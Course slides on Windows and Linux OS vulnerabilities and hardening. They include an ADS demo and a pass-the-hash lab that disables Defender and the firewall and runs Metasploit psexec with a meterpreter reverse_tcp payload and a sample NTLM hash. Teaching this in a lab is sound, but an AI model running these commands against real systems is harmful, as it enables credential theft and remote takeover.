# Desktop and Server OS Vulnerabilities

Objectives
---
- Describe vulnerabilities of Windows and Linux operating systems
- Identify specific vulnerabilities and explain ways to fix them
- Explain techniques to harden systems against Windows and Linux vulnerabilities


Windows OS Vulnerabilities
---
- Many Windows OSs have serious vulnerabilities
- Windows 2000 and earlier
  - Administrators must disable, reconfigure, or uninstall services and features
- Windows XP, Vista, 7, 8, 10, and 11
  - And Windows Server 2003, 2008, 2012, 2016, 2019 and 2022;
  - Most services and features are disabled by default


[CVE List](https://www.cve.org/)
---
- under construction
- [keyword search](https://cve.mitre.org/cve/search_cve_list.html)


Windows File Systems
---
- Stores and manages information
  - User created
  - OS files needed to boot
- Most vital part of any OS
  - Can be a vulnerability


File Allocation Table
---
- Original Microsoft file system
  - Supported by nearly all desktop and server OS's
  - Standard file system for most removable media
    - Other than CDs and DVDs
  - Later versions provide for larger file and disk sizes
- Most serious shortcoming
  - Doesn't support file-level access control lists (ACLs)
    - Necessary for setting permissions on files
    - Multiuser environment use results in vulnerability


NTFS
---
- New Technology File System (NTFS)
  - First released as high-end file system 
  - Added support for larger files, disk volumes, and ACL file security
- Subsequent Windows versions 
  - Included upgrades for compression, journaling, file-level encryption, and self-healing
- Alternate data streams (ADSs)
  - Can “stream” (hide) information behind existing files
    - Without affecting function, size, or other information
  - Several detection methods


Practice
---
- Inside Windows VM, open a Command Prompt
  ```cmd
  :: 1. create a text file
  echo "some normal data" > mydata.txt
  :: 2. save extra data to ADS
  echo "extra data saved in ADS" > mydata.txt:ads
  :: 3. check ADS data
  dir /r
  type mydata.txt:ads
  ```


Remote Procedure Call(RPC)
---
- Interprocess communication mechanism
  - Allows a program running on one host to run code on a remote host
- Worm that exploited RPC
  - Conficker worm
- Microsoft Baseline Security Analyzer
  - Determines if system is vulnerable due to an RPC-related issue


Practice
---
- Read and summarize the article [Windows 8.1 stops pass-the-hash attacks](https://www.csoonline.com/article/2612325/windows-8-1-stops-pass-the-hash-attacks.html)
- [Launch PtH attack on Windows 8.1](https://samsclass.info/lulz/pth-8.1.htm)

```cmd
:: 1. Simple Demo on a Workgroup
:: 1.1 Create a fresh Windows 8.1 virtual machine
:: 1.2 In HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters, make sure "RequireSecuritySignature" is set to 0 (it was)
:: 1.3 In HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System, add a new DWORD (32-bit) called "LocalAccountTokenFilterPolicy" and set it to 1
:: 1.4 Disable real-time protection in Windows Defender.
```

```bash
# 1.5 From Kali Linux, perform a Pass-the-Hash attack with this command, adjusting the IP addresses accordingly:
msfcli msfcli /usr/share/metasploit-framework/lib/msf/core/exploit/windows/smb/psexec PAYLOAD=windows/meterpreter/reverse_tcp LHOST=Kali_ip LPORT=443 RHOST=Windows_8.1_ip SMBUser=Admin2 SMBPass=aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 E
```

```cmd
:: 2. In a Domain
:: 2.1 Make a Server 2012 domain controller 
:: 2.2 Join Win 8.1 machine to the domain
:: 2.3 In "Network and Sharing Center", click "Change advanced sharing settings". In the Domain profile, turn on "network discovery" and "file and printer sharing"
:: 2.4 Turn off Windows Firewall for Domain profile
```

```bash
# In Kali,
cd
cd .msf4/modules
mkdir exploits
cd exploits 
mkdir windows
cd windows

mkdir powershell
cd powershell

wget https://raw.github.com/jakxx/metasploit-framework/powershell_psexec/modules/exploits/windows/powershell/powershell_psexec.rb

msfconsole

use exploit/windows/powershell/powershell_psexec
set RHOST Windows_8.1_ip
set LHOST Kali_ip 
set ARCH x86
set SMBDomain sam.com
set SMBUser Administrator
set SMBPASS 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42
exploit
```

- Read then summarize the article [Security Thoughts: LSASS Protection in Windows 8.1 and Windows Server 2012 R2](https://dirteam.com/sander/2014/06/24/security-thoughts-lsass-protection-in-windows-8-1-and-windows-server-2012-r2/)
  - Domain account mitigation
    - Reduced credential footprint
    - Aggressive session expiry
    - New "protected users" RID
    - Hardened LSASS process
  - Authentication policies and silos
    - Enable isolation of users or resources
      - Keeps user in their silo
      - Prevents outside access to silo
    - 2012R2 domains support authentication policies and silos
      - Policies allow custom ticket lifetime and issuance conditions
      - Can restrict users and service accounts



Windows Defender Exploit Guard
---
- New in Windows 10 Fall Creators Update (10-23-17)
- Attack Surface Reduction (ASR)
  - Uses machine learning to stop zero-day attacks
- Network protection
  - Blocks outbound connections to known malicious servers
- [Controlled folder access](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/controlled-folders)
- Exploit protection



NetBIOS
---
- Software loaded into memory 
  - Enables computer program to interact with network resource or device
- NetBIOS isn’t a protocol
  - Interface to a network protocol
- NetBios Extended User Interface (NetBEUI)
  - Fast, efficient network protocol
  - Allows NetBIOS packets to be transmitted over TCP/IP
  - NBT is NetBIOS over TCP
- Systems running newer Windows OSs 
  - Vista, Server 2008, Windows 7, and later versions
  - Share files and resources without using NetBIOS
- NetBIOS is still used for backward compatibility
  - Companies use old machines


Server Message Block
---
- Used to share files 
  - Usually runs on top of:
    - NetBIOS
    - NetBEUI, or
    - TCP/IP
- Several hacking tools target SMB
  - [L0phtcrack’s](https://l0phtcrack.gitlab.io/) SMB Packet Capture utility and SMBRelay
    - It took Microsoft seven years to patch these
- SMB2 
  - Introduced in Windows Vista
  - Several new features
  - Faster and more efficient
  - [A smb2 bug: More explication on CVE-2009-3103](https://g-laurent.blogspot.com/2009/10/more-explication-on-cve-2009-3103.html)
- Windows 7
  - Microsoft avoided reusing code
  - Still allowed backward capability
    - Windows XP Mode
  - Spectacular DoS vulnerabilities


Common Internet File System
---
- Standard protocol
  - Replaced SMB for Windows 2000 Server and later
  - SMB is still used for backward compatibility
  - Described as just a renaming of SMB by Wikipedia
- Remote file system protocol 
  - Enables sharing of network resources over the Internet
- Relies on other protocols to handle service announcements
  - Notifies users of available resources
- Enhancements
  - Locking features
  - Caching and read-ahead/write-behind
  - Support for fault tolerance
  - Capability to run more efficiently over dial-up
  - Support for anonymous and authenticated access
- Server security methods
  - Share-level security (folder password)
  - User-level security (username and password)
- Attackers look for servers designated as domain controllers
  - Severs handle authentication
- Windows Server 2003 and 2008
  - Domain controller uses a global catalog (GC) server 
    - Locates resources among many objects


Domain Controller Ports
---
- By default, Windows Server 2003 and 2008 domain controllers using CIFS listen on the following ports
  - DNS (port 53)
  - HTTP (port 80)
  - Kerberos (port 88)
  - RPC (port 135)
  - NetBIOS Name Service (port 137)
  - NetBIOS Datagram Service (port 139)
  - LDAP (port 389)
  - HTTPS (port 443)
  - SMB/ CIFS (port 445)
  - LDAP over SSL (port 636)
  - Active Directory global catalog (port 3268)


Null Sessions
---
- Anonymous connection established without credentials
  - Used to display information about users, groups, shares, and password policies
  - Necessary only if networks need to support older Windows versions
- To enumerate NetBIOS vulnerabilities use:
  - nbtstat, Net view, Netstat, Ping, Pathping, and Telnet commands


Web Services
---
- IIS installs with critical security vulnerabilities
  - IIS Lockdown Wizard
    - Locks down IIS versions 4.0 and 5.0
- IIS 6.0 and later versions
  - Installs with a “secure by default” mode
  - Previous versions left crucial security holes
- Keeping a system patched is important
- Configure only needed services 


SQL Server
---
- Many potential vulnerabilities
  - Null System Administrator (SA) password
    - SA access through SA account 
    - SA with blank password by default on versions prior to SQL Server 2005
  - Gives attackers administrative access 
    - Database and database server


Buffer Overflows
---
- Data is written to a buffer and corrupts data in memory next to allocated buffer
  - Normally, occurs when copying strings of characters from one buffer to another
- Functions don't verify text fits
  - Attackers run shell code
- C and C++ 
  - Lack built-in protection against overwriting data in memory


Passwords and Authentication
---
- Weakest security link in any network 
  - Authorized users
    - Most difficult to secure
    - Relies on people
  - Companies should take steps to address it
- Comprehensive password policy is critical
  - Should include:
    - Change passwords regularly
    - Require at least six characters (too short!)
    - Require complex passwords
    - Passwords can’t be common words, dictionary words, slang, jargon, or dialect
    - Passwords must not be identified with a user
    - Never write it down or store it online or in a file
    - Do not reveal it to anyone
    - Use caution when logging on and limit reuse
- Configure domain controllers
  - Enforce password age, length, and complexity
- Password policy aspects that can be enforced:
  - Account lockout threshold
    - Set number of failed attempts before account is disabled temporarily
  - Account lockout duration
    - Set period of time account is locked out after failed logon attempts
- Disable LM Hashes


Tools for Identifying Vulnerabilities in Windows
---
- Many tools are available
  - Using more than one is advisable
- Using several tools 
  - Helps pinpoint problems more accurately


Built-in Windows Tools
---
- [Microsoft Baseline Security Analyzer (MBSA)](https://learn.microsoft.com/en-us/windows/security/threat-protection/mbsa-removal-and-guidance)
- Capable of checking for:
  - Patches
  - Security updates
  - Configuration errors
  - Blank or weak passwords


Using MBSA
---
- System must meet minimum requirements 
  - Before installing
- After installing, MBSA can:
  - Scan itself
  - Scan other computers remotely
  - Be scanned remotely



Best Practices for Hardening Windows Systems
---
- Patching Systems: Best way to keep systems secure
  - Keep up to date
    - Attackers take advantage of known vulnerabilities
- Options for small networks
  - Accessing Windows Update manually
  - Configure Automatic Updates
- Options for large networks from Microsoft
  - Systems Management Server (SMS)
  - Windows Software Update Service (WSUS)
  - SCCM (System Center Configuration Manager)
- Third-party patch management solutions
  - BigFix
  - Tanium
  - BladeLogic


Antivirus Solutions
---
- Antivirus solution is essential
  - Small networks
    - Desktop antivirus tool with automatic updates
  - Large networks
    - Require corporate-level solution
- Antivirus tools 
  - Almost useless if not updated regularly


PUPs (Potentially Unwanted Programs)
---
- Programs that come bundled with freeware
- Not technically viruses or illegal
- Most antivirus won't block them by default


Enable Logging and Review Logs Regularly
---
- Important step for monitoring critical areas
  - Performance
  - Traffic patterns
  - Possible security breaches
- Can have negative impact on performance
- Review regularly 
  - Signs of intrusion or problems
    - Use log-monitoring tool


Disable Unused Services and Filtering Ports
---
- Disable unneeded services
- Delete unnecessary applications or scripts
  - Unused applications are invitations for attacks
- Reducing the attack surface
  - Open only what needs to be open, and close everything else
- Filter out unnecessary ports
  - Make sure perimeter routers filter out ports 137 to 139 and 445


Other Security Best Practices
---
- Limit the number of Administrator accounts
- Implement software to prevent sensitive data from leaving the network (Data Loss Prevention)
- Use network segmentation to make it more difficult for an attacker to move from computer to computer
- Restrict the number of applications allowed to run
- Delete unused scripts and sample applications
- Delete default hidden shares
- Use different naming scheme and passwords for public interfaces
- Ensure sufficient length and complexity of passwords
- Be careful of default permissions
- Use appropriate packet-filtering techniques such as firewalls and Intrusion Detection Systems
- Use available tools to assess system security
- Use a file integrity checker like Tripwire
- Disable Guest account 
- Disable the local Administrator account
- Make sure there are no accounts with blank passwords
- Use Windows group policies to enforce security configurations
- Develop a comprehensive security awareness program
- Keep up with emerging threats


Practice
---
- Read the latest [Microsoft Digital Defense Report](https://www.microsoft.com/en-us/security/business/security-intelligence-report)
- Read the article [HTTP Strict Transport Security](https://https.cio.gov/hsts/)


Linux OS Vulnerabilities
---
- Linux can be made more secure 
  - Awareness of vulnerabilities 
  - Keep current on new releases and fixes
- Many versions are available
  - Differences ranging from slight to major
- It’s important to understand basics
  - Run control and service configuration
  - Directory structure and file system
  - Basic shell commands and scripting 
  - Package management


Samba
---
- Open-source implementation of CIFS
  - Created in 1992
- Allows sharing resources over a network
  - Security professionals should have basic knowledge of SMB and Samba
    - Many companies have a mixed environment of Windows and *nix systems
- Used to “trick” Windows services into believing *nix resources are Windows resources


Tools for Identifying Linux Vulnerabilities
---
- [CVE Web site](https://cve.mitre.org/cve/search_cve_list.html)
  - Source for discovering possible attacker avenues


OpenVAS can enumerate multiple OSs
---
- Security tester using enumeration tools can:
  - Identify a computer on the network by using port scanning and zone transfers
  - Identify the OS by conducting port scanning
  - Identify via enumeration any logon accounts 
  - Learn names of shared folders by using enumeration
  - Identify services running


Checking for Trojan Programs
---
- Most Trojan programs perform one or more of the following:
- Allow remote administration of attacked system
- Create a file server on attacked computer
  - Files can be loaded and downloaded
- Steal passwords from attacked system 
  - E-mail them to attacker
- Log keystrokes 
  - E-mail results or store them in a hidden file the attacker can access remotely
- Encrypt or destroy files on the system
- Linux Trojan programs 
  - Sometimes disguised as legitimate programs
  - Contain program code that can wipe out file systems
  - More difficult to detect today
    - Protecting against identified Trojan programs is easier
- Rootkits containing Trojan binary programs
  - More dangerous
  - Attackers hide tools 
    - Perform further attacks
    - Have access to backdoor programs


More Countermeasures Against Linux Attacks
---
- User awareness training
- Keeping current
- Configuring systems to improve security


User Awareness Training
---
- Inform users
  - No information should be given to outsiders
    - Knowing OS makes attacks easier
  - Be suspicious of people asking questions 
    - Verify who they are talking to
    - Call them back


Keeping Current
---
- As soon as a vulnerability is discovered and posted 
  - OS vendors notify customers 
    - Upgrades 
    - Patches
  - Installing fixes promptly is essential
- Linux distributions 
  - Most have warning methods


Secure Configuration
---
- Vulnerability scanners
- Built-in Linux tools
- SE Linux implements Mandatory Access Control
  - Included in many Linux distributions
- Free benchmark tools
  - Center for Internet Security
- Security Blanket 




# References